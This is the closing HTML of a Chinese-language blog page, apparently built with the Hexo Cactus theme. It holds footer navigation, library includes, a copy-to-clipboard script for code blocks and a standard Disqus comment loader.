          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
